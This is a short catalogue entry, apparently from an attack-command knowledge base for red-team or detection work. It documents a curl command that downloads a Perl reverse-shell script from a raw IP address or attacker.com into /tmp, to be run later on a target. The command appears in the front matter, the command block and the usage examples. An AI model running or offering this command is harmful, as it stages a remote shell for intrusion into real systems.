---
id: cmd-curl-download
data: 'curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl'
tags:
  - download
  - payload
type: command
output: Perl script saved to /tmp/shell2.pl
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.680Z'
verified: false
validated: true
submitted: true
---
# curl-download-shell

## Command

```bash
curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl
```

## Description

Downloads a Perl reverse shell script from an attacker-controlled server to a temporary location on the target for later execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| http://138.68.1.244/shell.pl | URL of the payload | Yes |
| -o /tmp/shell2.pl | Output file path | Yes |

## Examples

### Basic Usage

```bash
curl http://attacker.com/shell.pl -o /tmp/shell.pl
```

### Advanced Usage

With silent mode: curl -s http://138.68.1.244/shell.pl -o /tmp/shell2.pl

## Expected Output

HTTP 200, file created with Perl code content.

## Related

- [[commands/perl-execute-shell]]
